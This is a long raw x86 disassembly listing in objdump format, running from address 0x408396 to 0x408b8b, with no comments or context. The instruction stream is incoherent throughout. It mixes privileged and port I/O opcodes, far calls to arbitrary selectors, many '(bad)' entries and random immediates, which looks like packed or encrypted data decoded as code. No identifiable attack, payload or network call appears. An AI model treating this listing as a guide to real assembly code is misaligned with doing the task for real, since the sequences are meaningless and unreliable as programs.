  408396:	xor    edx,DWORD PTR [edx]
  408398:	and    al,0x67
  40839a:	mov    ch,0x42
  40839c:	out    dx,eax
  40839d:	or     eax,0x4166749c
  4083a2:	fidiv  WORD PTR [esi-0x3b5b8f7d]
  4083a8:	mov    ebp,0x14e60244
  4083ad:	mov    eax,ds:0xd882d74c
  4083b2:	retf   
  4083b3:	pop    edx
  4083b4:	iret   
  4083b5:	in     eax,0x3b
  4083b7:	sub    eax,0x3f151dfc
  4083bc:	imul   ebx,DWORD PTR [ecx],0x40
  4083bf:	cwde   
  4083c0:	scas   eax,DWORD PTR es:[edi]
  4083c1:	je     0x4083b5
  4083c3:	and    ebx,DWORD PTR ds:0xabb2e69b
  4083c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083ca:	dec    ebx
  4083cb:	ss repz push eax
  4083ce:	mov    ecx,0xef2e9783
  4083d3:	rol    BYTE PTR [edx+ecx*4+0x2d6a13f7],0xd3
  4083db:	push   es
  4083dc:	loope  0x408459
  4083de:	shl    DWORD PTR [esi-0x1998e40e],0x3
  4083e5:	iret   
  4083e6:	aaa    
  4083e7:	pushf  
  4083e8:	or     eax,DWORD PTR [esi+0x34a2d687]
  4083ee:	sbb    eax,0x7cd175d2
  4083f3:	mov    edi,0x54d5fe6d
  4083f8:	lods   al,BYTE PTR ds:[esi]
  4083f9:	out    dx,eax
  4083fa:	xchg   dl,ch
  4083fc:	ins    BYTE PTR es:[edi],dx
  4083fd:	retf   
  4083fe:	jmp    0x4083f1
  408400:	or     eax,ecx
  408402:	test   eax,0xdb92002
  408407:	dec    ebp
  408408:	pop    esp
  408409:	mov    edx,0x70e08f72
  40840e:	in     eax,dx
  40840f:	aam    0xba
  408411:	push   ebx
  408412:	aad    0xd2
  408414:	push   ecx
  408415:	mov    ds:0x236e44f8,eax
  40841a:	add    BYTE PTR [eax+ebp*2+0x2b],ch
  40841e:	pop    esi
  40841f:	sbb    eax,0x4086b8fd
  408424:	retf   0xc77d
  408427:	lock cmp edi,0xffffffac
  40842b:	push   ebp
  40842c:	push   esp
  40842d:	stos   BYTE PTR es:[edi],al
  40842e:	xchg   dh,cl
  408430:	sbb    DWORD PTR [ebx+0x330d04b6],edx
  408436:	inc    ebp
  408437:	stos   DWORD PTR es:[edi],eax
  408438:	mov    fs,WORD PTR [eax-0x71]
  40843b:	enter  0xd07,0x9a
  40843f:	dec    ebx
  408440:	call   0xf383:0x2a843c78
  408447:	pop    ebx
  408448:	inc    eax
  408449:	int    0xa0
  40844b:	mov    cl,0xb6
  40844d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40844e:	rcr    bh,0x8e
  408451:	sahf   
  408452:	int    0x67
  408454:	push   ebp
  408455:	lods   al,BYTE PTR ds:[esi]
  408456:	imul   esi,DWORD PTR gs:[ebx-0x3bb82685],0x686c772d
  408461:	push   esp
  408462:	jecxz  0x408461
  408464:	inc    edx
  408465:	(bad)
  408468:	mov    WORD PTR [edx+edx*8],es
  40846b:	mov    eax,0x69f58887
  408470:	packuswb mm7,QWORD PTR [edi]
  408473:	or     ah,BYTE PTR [ebp-0x62]
  408476:	(bad)
  408479:	mov    bl,0xe
  40847b:	push   cs
  40847c:	pop    esp
  40847d:	jo     0x4084cf
  40847f:	aam    0xd6
  408481:	sbb    edx,DWORD PTR [edx+0x23]
  408484:	mul    BYTE PTR [ebx-0x2d]
  408487:	sub    bl,BYTE PTR [esi+eax*1]
  40848a:	cld    
  40848b:	xor    edi,DWORD PTR [ecx+0x2d]
  40848e:	fst    DWORD PTR [edx+0x4966b7f1]
  408494:	sbb    BYTE PTR [edi+0x54],ah
  408497:	mov    dh,0xe7
  408499:	jg     0x408434
  40849b:	cmp    BYTE PTR [ebx*8-0x748cdcf],ah
  4084a2:	pop    esp
  4084a3:	repz (bad) 
  4084a5:	and    al,0x89
  4084a7:	addr16 ret 0x8c99
  4084ab:	cmp    BYTE PTR [ecx+0x647b54c1],0xb6
  4084b2:	test   DWORD PTR [ebx-0x3b],edi
  4084b5:	xor    edi,esi
  4084b7:	mov    cl,bh
  4084b9:	push   ebp
  4084ba:	mov    edi,ecx
  4084bc:	std    
  4084bd:	mov    esi,esp
  4084bf:	adc    al,0xea
  4084c1:	or     BYTE PTR [ecx],ch
  4084c3:	dec    ecx
  4084c4:	inc    edx
  4084c5:	ins    DWORD PTR es:[edi],dx
  4084c6:	call   0x6b9f:0x99b3463
  4084cd:	xor    edx,ebp
  4084cf:	gs xor ah,ah
  4084d2:	mov    ebp,0x9af382fe
  4084d7:	fdiv   st,st(3)
  4084d9:	and    ah,dh
  4084db:	fisub  DWORD PTR [esi+esi*8+0x618b363f]
  4084e2:	pop    ss
  4084e3:	inc    edx
  4084e4:	ret    
  4084e5:	sub    BYTE PTR [ecx],dh
  4084e7:	jge    0x40850c
  4084e9:	repnz mov esp,0xd1bb8d09
  4084ef:	in     eax,dx
  4084f0:	enter  0xc788,0x62
  4084f4:	daa    
  4084f5:	stos   BYTE PTR es:[edi],al
  4084f6:	mov    eax,0x1f5c4abe
  4084fb:	add    bl,BYTE PTR [esi-0x9d745b4]
  408501:	xor    cl,dl
  408503:	cmp    al,0xcf
  408505:	hlt    
  408506:	nop
  408507:	xchg   ebp,eax
  408508:	adc    ebx,DWORD PTR [edx+0x427a111b]
  40850e:	mov    ch,0x37
  408510:	gs bnd jae 0x408540
  408514:	lock or DWORD PTR [ebx-0x2d],edx
  408518:	push   0x7e
  40851a:	ins    DWORD PTR es:[edi],dx
  40851b:	test   DWORD PTR [ecx-0x72ffe12a],eax
  408521:	xor    BYTE PTR [edx+eax*4-0x6b348e32],al
  408528:	sbb    al,0xe2
  40852a:	jecxz  0x4084c1
  40852c:	out    dx,eax
  40852d:	add    edi,DWORD PTR [edx+0x30a7eedc]
  408533:	sub    BYTE PTR [edx-0x67976231],ah
  408539:	ins    DWORD PTR es:[edi],dx
  40853a:	scas   eax,DWORD PTR es:[edi]
  40853b:	cmp    al,0x62
  40853d:	mov    edi,0x47eb5aee
  408542:	xchg   BYTE PTR [ebx],cl
  408544:	fisttp WORD PTR [ebx]
  408546:	call   0x25fe:0x462579ac
  40854d:	cmp    esi,DWORD PTR [eax-0x1b59887b]
  408553:	cmp    eax,0x1f49e5b6
  408558:	push   0xffffffd9
  40855a:	adc    eax,0x8791fd34
  40855f:	mov    cl,dh
  408561:	movsx  ecx,dx
  408564:	mov    ah,0xe
  408566:	pop    ecx
  408567:	cld    
  408568:	pop    edi
  408569:	pushf  
  40856a:	ficom  WORD PTR [esi+0x34]
  40856d:	xchg   ebp,eax
  40856e:	mov    dh,0xb2
  408570:	xchg   ecx,eax
  408571:	test   DWORD PTR [ecx-0x68f16c3b],ecx
  408577:	and    al,dl
  408579:	pop    ebx
  40857a:	pop    es
  40857b:	sbb    eax,0x42e97688
  408580:	mov    cl,0xa6
  408582:	mov    gs,WORD PTR [ebp+edx*2+0x59916f32]
  408589:	xlat   BYTE PTR ds:[ebx]
  40858a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40858b:	aaa    
  40858c:	ds mov dl,0x34
  40858f:	pop    edi
  408590:	lahf   
  408591:	stos   BYTE PTR es:[edi],al
  408592:	int3   
  408593:	(bad)  
  408594:	mov    ebp,0xe4fa9754
  408599:	scas   al,BYTE PTR es:[edi]
  40859a:	xchg   DWORD PTR [eax],ecx
  40859c:	xor    al,0xa9
  40859e:	jmp    0xd41393e1
  4085a3:	jo     0x4085b7
  4085a5:	ret    
  4085a6:	mov    ebx,0xee13afde
  4085ab:	xchg   edi,eax
  4085ac:	dec    esp
  4085ad:	iret   
  4085ae:	pop    ss
  4085af:	pop    es
  4085b0:	inc    esp
  4085b1:	(bad)  
  4085b3:	fld    TBYTE PTR [edx+0x77]
  4085b6:	ret    0x37a6
  4085b9:	add    BYTE PTR [esi+0x39],al
  4085bc:	fcom   QWORD PTR [ecx-0x47415234]
  4085c2:	pushf  
  4085c3:	retf   0x80f4
  4085c6:	sbb    edx,DWORD PTR [esi]
  4085c8:	push   0x3a21977b
  4085cd:	in     eax,0x94
  4085cf:	jmp    0xaac2:0x72865e2d
  4085d6:	dec    eax
  4085d7:	daa    
  4085d8:	add    eax,0xf7fd4695
  4085dd:	stc    
  4085de:	aas    
  4085df:	fidivr DWORD PTR [esi-0xa]
  4085e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085e3:	(bad)  
  4085e4:	sbb    ebp,DWORD PTR [edx]
  4085e6:	adc    al,0x11
  4085e8:	sbb    ch,BYTE PTR ds:0x2c167092
  4085ee:	sbb    eax,0x3fc84a64
  4085f3:	xor    al,0x3f
  4085f5:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4085f7:	leave  
  4085f8:	pusha  
  4085f9:	fistp  WORD PTR [edi]
  4085fb:	call   DWORD PTR [ebx+ecx*1]
  4085fe:	icebp  
  4085ff:	ins    DWORD PTR es:[edi],dx
  408600:	pop    edi
  408601:	jbe    0x408639
  408603:	mov    ecx,0x9badf563
  408608:	cmp    dh,bh
  40860a:	adc    BYTE PTR [ecx+0x16ca7dfe],bh
  408610:	pop    ecx
  408611:	add    BYTE PTR [edi],dl
  408613:	jne    0x408614
  408615:	imul   ecx,DWORD PTR [ebx],0x7f
  408618:	mov    ebx,0xb5de4c38
  40861d:	mov    ebp,0xea87e28c
  408622:	mov    ?,WORD PTR [ecx-0x218deb1d]
  408628:	sbb    DWORD PTR [esi+0x2d],edx
  40862b:	add    bh,BYTE PTR [esi-0x4d]
  40862e:	pop    ss
  40862f:	xchg   edx,eax
  408630:	xor    al,0x61
  408632:	and    DWORD PTR [edi+0x19b52b8c],esp
  408638:	push   esi
  408639:	jg     0x4085ef
  40863b:	je     0x4085da
  40863d:	sub    BYTE PTR [edx],bl
  40863f:	retf   
  408640:	mov    ebx,0xce2ecf9d
  408645:	mov    ebp,0xcb354b5f
  40864a:	cmp    al,0x5a
  40864c:	pop    edx
  40864d:	inc    ebx
  40864e:	pop    ecx
  40864f:	mov    dl,0xee
  408651:	fucom  st(3)
  408653:	sub    bl,BYTE PTR [ebp+0xe26780b]
  408659:	inc    edx
  40865a:	mov    ah,0x82
  40865c:	popa   
  40865d:	add    DWORD PTR [edx],edx
  40865f:	xor    BYTE PTR [eax],dh
  408661:	xchg   ecx,eax
  408662:	cs and eax,0xa41cee2b
  408668:	mov    esp,0xab4254ce
  40866d:	sbb    DWORD PTR [ebx],0x93d04c24
  408673:	push   edi
  408674:	mov    BYTE PTR gs:[eax+edx*8],dh
  408678:	push   edx
  408679:	aaa    
  40867a:	stos   BYTE PTR es:[edi],al
  40867b:	adc    esi,DWORD PTR [esp+esi*2-0x77dd40d]
  408682:	dec    esp
  408683:	dec    edi
  408684:	div    BYTE PTR [ecx-0x49a9e690]
  40868a:	inc    edx
  40868b:	mov    ?,edx
  40868d:	adc    esi,DWORD PTR [ebx]
  40868f:	ror    ecx,1
  408691:	pop    esi
  408692:	xor    bl,BYTE PTR [eax]
  408694:	cmp    eax,0x5767b0b3
  408699:	stos   DWORD PTR es:[edi],eax
  40869a:	mov    esi,0x9cee55fd
  40869f:	xchg   ebx,eax
  4086a0:	sub    DWORD PTR ds:0xaa325cfb,0x9
  4086a7:	std    
  4086a8:	inc    edi
  4086a9:	mov    bh,0xcd
  4086ab:	jnp    0x408670
  4086ad:	jns    0x4086f4
  4086af:	int    0x7f
  4086b1:	jp     0x408669
  4086b3:	lds    eax,FWORD PTR [edx-0x21ca66b8]
  4086b9:	stos   DWORD PTR es:[edi],eax
  4086ba:	ret    0x33a2
  4086bd:	bound  esi,QWORD PTR ds:0xa9d7fef4
  4086c3:	outs   dx,BYTE PTR ds:[esi]
  4086c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086c5:	sbb    cl,bl
  4086c7:	loope  0x408721
  4086c9:	and    al,0xbd
  4086cb:	ja     0x408748
  4086cd:	lods   eax,DWORD PTR ds:[esi]
  4086ce:	inc    ecx
  4086cf:	cli    
  4086d0:	pushf  
  4086d1:	sti    
  4086d2:	dec    esi
  4086d3:	scas   eax,DWORD PTR es:[edi]
  4086d4:	jbe    0x4086b4
  4086d6:	fmul   st,st(0)
  4086d8:	call   0xc3c5:0xa927689b
  4086df:	jmp    0x4086c1
  4086e1:	stos   DWORD PTR es:[edi],eax
  4086e2:	xor    BYTE PTR [esi+0x9],bl
  4086e5:	fbld   TBYTE PTR [edx-0x7b]
  4086e8:	into   
  4086e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086ea:	add    al,0x65
  4086ec:	test   DWORD PTR [ecx+0x3de51b8e],esp
  4086f2:	pop    edi
  4086f4:	mov    ebx,0xa24774e2
  4086f9:	lds    esp,FWORD PTR [edx-0x54]
  4086fc:	adc    BYTE PTR [edx],bh
  4086fe:	pop    ecx
  4086ff:	sub    DWORD PTR [ebp-0x68d7fed2],esi
  408705:	mov    BYTE PTR [eax+0x365fd3ba],dh
  40870b:	add    ch,BYTE PTR [edi]
  40870d:	(bad)  
  40870e:	and    eax,0x2fe02459
  408713:	call   0x22da:0xa5a4ff34
  40871a:	js     0x4086a1
  40871c:	jge    0x4086d4
  40871e:	dec    esi
  40871f:	in     al,dx
  408720:	lock xor al,0x3c
  408723:	pop    esp
  408724:	or     eax,DWORD PTR [ecx+0x51110147]
  40872a:	jns    0x408774
  40872c:	pop    ecx
  40872d:	into   
  40872e:	adc    dh,BYTE PTR [ecx]
  408730:	inc    esp
  408731:	push   0x15
  408733:	sar    esp,cl
  408735:	fistp  WORD PTR [ebp-0x42ab6865]
  40873b:	addr16 into 
  40873d:	inc    eax
  40873e:	jae    0x4086c9
  408740:	loopne 0x408742
  408742:	sti    
  408743:	inc    ebp
  408744:	fsub   QWORD PTR [eax]
  408746:	arpl   WORD PTR [eax+0x5fc92106],cx
  40874c:	mov    eax,0x3e3d18b1
  408751:	scas   al,BYTE PTR es:[edi]
  408752:	add    al,0x3a
  408754:	add    BYTE PTR [esi],cl
  408756:	jge    0x4087bb
  408758:	cld    
  408759:	fmulp  st(4),st
  40875b:	mov    edx,0xa0ddf75b
  408760:	test   DWORD PTR [edx+0x3573398d],esi
  408766:	enter  0xf1e8,0xf2
  40876a:	(bad)  
  40876b:	fnsave [edx+0x5d6ac95e]
  408771:	xlat   BYTE PTR ds:[ebx]
  408772:	std    
  408773:	mov    esi,0xed730400
  408778:	jo     0x40873f
  40877a:	loope  0x408789
  40877c:	pop    ecx
  40877d:	pop    ss
  40877e:	adc    eax,0xb64cd4fe
  408783:	neg    BYTE PTR es:[edx-0x3]
  408787:	xchg   ebx,eax
  408788:	sbb    al,dl
  40878a:	adc    eax,0x9c4a840
  40878f:	mov    es,WORD PTR [ebx]
  408791:	cs mov edi,0x68a4a083
  408797:	fisub  DWORD PTR [eax-0x53312663]
  40879d:	cmp    BYTE PTR [edx-0x33],bh
  4087a0:	aas    
  4087a1:	mov    ah,0x33
  4087a3:	shl    eax,0xb6
  4087a6:	icebp  
  4087a7:	and    al,0x1f
  4087a9:	out    dx,al
  4087aa:	ja     0x408757
  4087ac:	cld    
  4087ad:	inc    esi
  4087ae:	add    eax,0x98aa1c2a
  4087b3:	xlat   BYTE PTR ds:[ebx]
  4087b4:	mov    eax,0x6ab776c0
  4087b9:	and    DWORD PTR [eiz*4+0x3d8346ed],ebx
  4087c0:	in     eax,dx
  4087c1:	jmp    0x53b9:0xadc26a1e
  4087c8:	sub    ch,BYTE PTR [ecx+0x2b]
  4087cb:	arpl   WORD PTR ss:[ebp+0x2b],sp
  4087cf:	xlat   BYTE PTR ds:[ebx]
  4087d0:	fadd   QWORD PTR [edx]
  4087d2:	fisubr DWORD PTR [edi+0x62fdd791]
  4087d8:	test   al,0x53
  4087da:	adc    DWORD PTR [edi-0x1],esi
  4087dd:	pop    ebp
  4087de:	xor    dh,BYTE PTR [esi]
  4087e0:	sbb    eax,0x120909cf
  4087e5:	into   
  4087e6:	cmp    ah,BYTE PTR [edi+ecx*1-0xd]
  4087ea:	sti    
  4087eb:	ss out dx,al
  4087ed:	mov    eax,ds:0x684e2f05
  4087f2:	test   BYTE PTR [ebx],dl
  4087f4:	jno    0x4087e4
  4087f6:	xor    ebp,edx
  4087f8:	mov    eax,ds:0xbeb12390
  4087fd:	jl     0x4087d0
  4087ff:	(bad)  
  408800:	mov    eax,ds:0x1be88c26
  408805:	test   DWORD PTR [eax-0x27633ef8],esi
  40880b:	jmp    0x9c412f9c
  408810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408811:	repz pop ecx
  408814:	cmc    
  408815:	mov    gs,WORD PTR [ecx+edx*2+0x73]
  408819:	arpl   WORD PTR [esi-0x6dfb694],bx
  40881f:	xor    dh,BYTE PTR [edx]
  408821:	pop    es
  408822:	and    al,0x35
  408824:	repnz sbb BYTE PTR [ebp+0x78d5459a],0xaa
  40882c:	or     al,bl
  40882e:	arpl   WORD PTR [edx+edi*1],bp
  408831:	xor    BYTE PTR [ebp+eiz*4-0x3a],0x9e
  408836:	fmul   st(5),st
  408838:	inc    edi
  408839:	frstor [edi+0x3c]
  40883c:	test   eax,0xa5a14baf
  408841:	jne    0x40880f
  408843:	sbb    DWORD PTR [edx],ebx
  408845:	mov    ds:0x807fb55f,al
  40884a:	cdq    
  40884b:	ins    BYTE PTR es:[edi],dx
  40884c:	push   ebp
  40884d:	adc    DWORD PTR [ecx+ebx*2-0x746ffa46],ecx
  408854:	das    
  408855:	and    BYTE PTR [esi-0x60],al
  408858:	mov    eax,ds:0xdab11002
  40885d:	mov    esp,0xccf9af68
  408862:	stos   DWORD PTR es:[edi],eax
  408863:	dec    eax
  408864:	(bad)  
  408865:	lods   al,BYTE PTR ds:[esi]
  408866:	fidivr DWORD PTR [ebp+0x5]
  408869:	jno    0x408811
  40886b:	mov    ah,0x99
  40886d:	dec    eax
  40886e:	mov    edi,DWORD PTR es:[edi-0x64]
  408872:	int    0x89
  408874:	adc    esp,DWORD PTR ds:0x756768e5
  40887a:	push   edx
  40887b:	mov    eax,ds:0xababa818
  408880:	adc    eax,0x968bcb81
  408885:	mov    ah,0x5b
  408887:	inc    esp
  408888:	das    
  408889:	jno    0x4088eb
  40888b:	or     BYTE PTR [eax],dh
  40888d:	fldcw  WORD PTR ss:[ecx]
  408890:	push   cs
  408891:	mov    WORD PTR [edx],ds
  408893:	aad    0x84
  408895:	(bad)  
  408896:	jnp    0x408839
  408898:	stc    
  408899:	push   ecx
  40889a:	or     eax,0x2d784082
  40889f:	(bad)  
  4088a0:	dec    esi
  4088a1:	mov    edx,DWORD PTR [esi+0x62]
  4088a4:	retf   
  4088a5:	xor    ebp,ebx
  4088a7:	enter  0x21d4,0x1b
  4088ab:	rol    DWORD PTR [eax+0x59],cl
  4088ae:	push   esi
  4088af:	mov    esi,0xde1b97c4
  4088b4:	into   
  4088b5:	lds    eax,FWORD PTR [edi+0x5b9324b4]
  4088bb:	sbb    dl,bh
  4088bd:	out    dx,eax
  4088be:	adc    eax,0x4627e95b
  4088c3:	sahf   
  4088c4:	dec    esp
  4088c5:	fnstsw WORD PTR [edi+ebx*2-0x61504a5d]
  4088cc:	and    BYTE PTR [esp+eiz*8],bl
  4088cf:	push   ebx
  4088d0:	mov    esp,0x6030eb56
  4088d5:	cmp    esi,DWORD PTR [ebx-0x5239ef56]
  4088db:	test   eax,0x79fe9822
  4088e0:	adc    BYTE PTR [ebx-0x4f],ah
  4088e3:	hlt    
  4088e4:	shl    DWORD PTR [eax+0x15d0942d],cl
  4088ea:	addr16 pop esp
  4088ec:	sbb    al,0x17
  4088ee:	push   ss
  4088ef:	mov    dl,0xa5
  4088f1:	sub    edi,DWORD PTR [esi+ebp*2-0x50]
  4088f5:	jg     0x408946
  4088f7:	dec    ecx
  4088f8:	cli    
  4088f9:	popa   
  4088fa:	das    
  4088fb:	lods   eax,DWORD PTR ds:[esi]
  4088fc:	addr16 mov edx,0xb31d482
  408902:	jmp    0xee4a0b5c
  408907:	shr    BYTE PTR [ecx-0xb],1
  40890a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40890b:	push   DWORD PTR [ebp-0x23aed263]
  408911:	lock loopne 0x408965
  408914:	mov    bl,0xa0
  408916:	mov    esp,0x1a1e99a0
  40891b:	or     cl,BYTE PTR [ecx]
  40891d:	popa   
  40891e:	cmp    eax,0xf495adba
  408923:	lahf   
  408924:	xchg   ecx,eax
  408925:	sbb    BYTE PTR [edi],bh
  408927:	(bad)  
  408928:	or     al,0x9
  40892a:	call   0x7cff:0x6e4af817
  408931:	call   0xf4b6bcf3
  408936:	bound  eax,QWORD PTR [ebx-0x2d]
  408939:	loope  0x40899c
  40893b:	push   ecx
  40893c:	add    dh,BYTE PTR [edi+0x7023fc2]
  408942:	or     dl,BYTE PTR [ebx]
  408944:	scas   al,BYTE PTR es:[edi]
  408945:	adc    cl,BYTE PTR [eax+0x59]
  408948:	jecxz  0x40893c
  40894a:	jg     0x4088fd
  40894c:	dec    esp
  40894d:	les    ebx,FWORD PTR [edx+0x56]
  408950:	dec    ebx
  408951:	call   0xb2d5:0x67aa7122
  408958:	hlt    
  408959:	pop    ecx
  40895a:	dec    ebx
  40895b:	jg     0x408935
  40895d:	mov    ecx,DWORD PTR [ecx-0x55e9fac3]
  408963:	and    BYTE PTR [eax+0x2a],bl
  408966:	inc    ebx
  408967:	lds    edx,FWORD PTR [ebp-0xc409a7e]
  40896d:	inc    esi
  40896e:	sbb    ecx,edi
  408970:	xor    al,0x30
  408972:	inc    esp
  408973:	mov    BYTE PTR [ebp-0x1c],cl
  408976:	and    BYTE PTR [edx],bl
  408978:	in     al,0x45
  40897a:	fs jnp 0x4089c5
  40897d:	ds sar ecx,1
  408980:	sbb    DWORD PTR [ebp-0x7c2262e3],ecx
  408986:	imul   ecx,DWORD PTR [edi-0x2a],0x6e180672
  40898d:	int3   
  40898e:	int3   
  40898f:	mov    esp,0x7f08397e
  408994:	mov    esp,0x38779231
  408999:	int3   
  40899a:	(bad)  
  40899b:	dec    esp
  40899c:	and    dl,BYTE PTR [ecx]
  40899e:	adc    BYTE PTR [ecx],al
  4089a0:	imul   edi,DWORD PTR [ebx],0x3f
  4089a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089a4:	jl     0x408a22
  4089a6:	xchg   edx,eax
  4089a7:	nop
  4089a8:	jg     0x40899b
  4089aa:	pop    es
  4089ab:	push   0xfffffff2
  4089ad:	mov    ebx,DWORD PTR [edx+eiz*8]
  4089b0:	(bad)  
  4089b2:	or     esi,DWORD PTR [eax]
  4089b4:	cmp    eax,0xed4de76f
  4089b9:	call   0x73f:0x4ca1390d
  4089c0:	xor    DWORD PTR [edi+0x74],0x20cf578d
  4089c7:	in     al,dx
  4089c8:	in     eax,0xf3
  4089ca:	fwait
  4089cb:	pop    ebx
  4089cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089cd:	xor    BYTE PTR [ecx+0x38d5de96],al
  4089d3:	inc    esi
  4089d4:	pop    ds
  4089d5:	and    DWORD PTR [ebp+eiz*4+0x4b],esp
  4089d9:	adc    ebp,edx
  4089db:	mov    ds:0x820d98b8,eax
  4089e0:	fdivp  st(2),st
  4089e2:	or     eax,0xff2e4ce9
  4089e7:	loope  0x408a1b
  4089e9:	mov    ebx,0x8b68c5a9
  4089ee:	cmp    dl,ch
  4089f0:	sti    
  4089f1:	or     eax,0x42554822
  4089f6:	fadd   QWORD PTR [ecx]
  4089f8:	jnp    0x40897a
  4089fa:	outs   dx,BYTE PTR ds:[esi]
  4089fb:	inc    edi
  4089fc:	xor    eax,0xbb6b7865
  408a01:	stc    
  408a02:	fcom   DWORD PTR [ebp-0x7e]
  408a05:	and    al,BYTE PTR [esi+0x45]
  408a08:	jae    0x4089e1
  408a0a:	stos   BYTE PTR es:[edi],al
  408a0b:	pop    ebx
  408a0c:	mov    ah,0x2a
  408a0e:	scas   al,BYTE PTR es:[edi]
  408a0f:	adc    ch,dl
  408a11:	mov    ds:0xa7cbd7a7,al
  408a16:	addr16 mov ds:0x3efc,eax
  408a1a:	cmp    ebx,ecx
  408a1c:	or     al,0xa6
  408a1e:	jnp    0x4089d0
  408a20:	inc    edi
  408a21:	lods   eax,DWORD PTR ds:[esi]
  408a22:	fild   QWORD PTR [eax+0x13e56a3d]
  408a28:	xor    DWORD PTR [eax+eiz*8-0x23],0xffffff8b
  408a2d:	inc    ebx
  408a2e:	out    0x79,al
  408a30:	mov    eax,ds:0x9ebb5a0f
  408a35:	test   DWORD PTR [ebx],0x5650284a
  408a3b:	xor    BYTE PTR [ebp-0x18],ah
  408a3e:	ss add eax,0xb5387c35
  408a44:	lods   al,BYTE PTR ds:[esi]
  408a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a46:	ins    BYTE PTR es:[edi],dx
  408a47:	mov    edx,0xf6091f51
  408a4c:	les    esp,FWORD PTR [esi]
  408a4e:	shr    DWORD PTR [esi+0x5202a763],1
  408a54:	sub    dl,BYTE PTR ds:0x32ce00f1
  408a5a:	add    dl,BYTE PTR [ecx+0x37]
  408a5d:	pop    ds
  408a5e:	mov    ds,WORD PTR [edx+0xd]
  408a61:	les    ebx,FWORD PTR [edx-0x7072d08e]
  408a67:	popf   
  408a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a69:	add    edi,DWORD PTR [ecx-0x54]
  408a6c:	mov    ds:0xf32741c7,al
  408a71:	mov    edx,0xe5ca17a
  408a76:	dec    esi
  408a77:	push   esp
  408a78:	mov    al,ds:0x5c6f9f9e
  408a7d:	(bad)  
  408a80:	into   
  408a81:	cli    
  408a82:	mov    ebx,DWORD PTR [edi+0x57]
  408a85:	cdq    
  408a86:	pop    ecx
  408a87:	aam    0x10
  408a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a8a:	and    bh,BYTE PTR [ebx]
  408a8c:	jle    0x408ae3
  408a8e:	xor    BYTE PTR [edx+edx*2+0x45],ch
  408a92:	jb     0x408a2e
  408a94:	in     al,dx
  408a95:	aad    0x4
  408a97:	fmul   QWORD PTR [esi-0x5614bbd4]
  408a9d:	repz xor eax,0x851a8c7e
  408aa3:	cmp    edi,DWORD PTR [edi+ebp*8+0x1d]
  408aa7:	loop   0x408afc
  408aa9:	int    0xd3
  408aab:	js     0x408a89
  408aad:	mov    cl,0xf5
  408aaf:	cmp    dl,0x1a
  408ab2:	sti    
  408ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ab4:	fcmovu st,st(7)
  408ab6:	mov    ch,0x91
  408ab8:	push   edi
  408ab9:	jp     0x408ac3
  408abb:	xchg   esp,eax
  408abc:	inc    ecx
  408abd:	popf   
  408abe:	push   ss
  408abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ac0:	xor    DWORD PTR [eax],0x33
  408ac3:	jno    0x408adf
  408ac5:	test   BYTE PTR [ebp+0x28],0x2a
  408ac9:	ins    BYTE PTR es:[edi],dx
  408aca:	add    BYTE PTR [ebp+ebp*2-0x6cec86d3],ch
  408ad1:	cmp    al,cl
  408ad3:	retf   
  408ad4:	jmp    0x6ef3c563
  408ad9:	jmp    0x2513bfc9
  408ade:	fld    QWORD PTR [eax-0x4b]
  408ae1:	push   ebx
  408ae2:	sub    DWORD PTR [eax+ecx*8+0x38e016fd],0x76
  408aea:	fwait
  408aeb:	jae    0x408b4b
  408aed:	outs   dx,BYTE PTR ds:[esi]
  408aee:	(bad)  
  408aef:	fdiv   QWORD PTR [eax-0xdb3dde4]
  408af5:	sub    ch,BYTE PTR [ebx]
  408af7:	pop    edx
  408af8:	mov    ebp,0x338138c
  408afd:	rol    BYTE PTR [esi],0xf
  408b00:	mov    eax,ds:0xc1e00a8e
  408b05:	cmp    eax,0xa236185b
  408b0a:	outs   dx,DWORD PTR ds:[esi]
  408b0b:	das    
  408b0c:	les    esp,FWORD PTR [ecx*4+0x134f205]
  408b13:	mov    ebp,0x8591399f
  408b18:	fnstsw WORD PTR [edx+ebp*1+0x36]
  408b1c:	loope  0x408b60
  408b1e:	mov    ?,WORD PTR [ebx+eiz*2-0xdf73458]
  408b25:	xchg   ecx,eax
  408b26:	retf   
  408b27:	sub    dl,BYTE PTR [esi+ebp*2+0x5c20929c]
  408b2e:	pop    edi
  408b2f:	mov    ebx,esi
  408b31:	lea    edi,[ebx+0x61947862]
  408b37:	dec    ebp
  408b38:	ss add al,0x22
  408b3b:	test   eax,0xfffefa6b
  408b40:	push   ecx
  408b41:	mov    ch,0xe7
  408b43:	hlt    
  408b44:	xchg   ebp,eax
  408b45:	aaa    
  408b46:	loope  0x408b84
  408b48:	cld    
  408b49:	mov    ds:0xf33b0052,al
  408b4e:	cmp    ebp,esi
  408b50:	and    DWORD PTR [ebp-0x29b14e84],ecx
  408b56:	scas   eax,DWORD PTR es:[edi]
  408b57:	es xor eax,0x6fe15caf
  408b5d:	std    
  408b5e:	xchg   edi,eax
  408b5f:	adc    BYTE PTR [ebp-0x67a4791b],ch
  408b65:	add    edx,eax
  408b67:	push   0x97cc198
  408b6c:	arpl   WORD PTR [eax-0x23],dx
  408b6f:	inc    eax
  408b70:	dec    edx
  408b71:	xor    al,0x3e
  408b73:	repnz pop ecx
  408b75:	xor    eax,0xf3ca6250
  408b7a:	stos   DWORD PTR es:[edi],eax
  408b7b:	adc    esi,ecx
  408b7d:	pop    edi
  408b7e:	loope  0x408bd6
  408b80:	add    esp,DWORD PTR [esi-0x63]
  408b83:	push   es
  408b84:	loopne 0x408b3f
  408b86:	push   ebx
  408b87:	rcl    BYTE PTR fs:[ebx],0xda
  408b8b:	ja     0x408bc4
